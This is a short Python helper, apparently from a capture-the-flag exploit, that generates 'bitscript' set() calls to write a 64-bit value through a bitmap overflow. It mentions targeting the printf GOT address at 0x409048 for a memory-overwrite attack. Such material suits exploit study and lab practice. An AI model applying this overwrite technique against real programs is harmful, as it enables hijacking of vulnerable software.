#!/usr/bin/env python3
"""
Generate bitscript code to write 64-bit value using bitmap overflow
"""

def write_64bit_bitscript(bitmap_name, value, start_y=0, start_x=0):
    """
    Generate bitscript code to write 64-bit value starting at (start_y, start_x)
    
    Args:
        bitmap_name: Name of bitmap variable
        value: 64-bit value to write
        start_y: Starting y coordinate
        start_x: Starting x coordinate
    
    Returns:
        List of set() statements
    """
    code = []
    
    for bit in range(64):
        bit_value = (value >> bit) & 1
        current_y = start_y + (bit // 8)
        current_x = start_x + (bit % 8)
        
        # Handle x overflow (wrap to next y)
        if current_x >= 8:
            current_y += 1
            current_x -= 8
        
        code.append(f"set({bitmap_name}, {current_x}, {current_y}, {bit_value});")
    
    return code

def main():
    # Test value: 0x41414141 (32 bits, zero-extended to 64)
    test_value = 0x41414141
    
    print("=== Generate 64-bit Write Code ===")
    print(f"Writing 0x{test_value:016x} starting at y=0, x=0")
    print()
    print("Generated bitscript code:")
    print()
    
    code = write_64bit_bitscript("b1", test_value, 0, 0)
    for line in code:
        print(line)
    
    print()
    print(f"Total: {len(code)} set() calls")
    print()
    print("To write printf@GOT address (0x409048):")
    printf_got = 0x409048
    code2 = write_64bit_bitscript("b1", printf_got, 0, 0)
    print(f"Would need {len(code2)} set() calls")

if __name__ == "__main__":
    main()

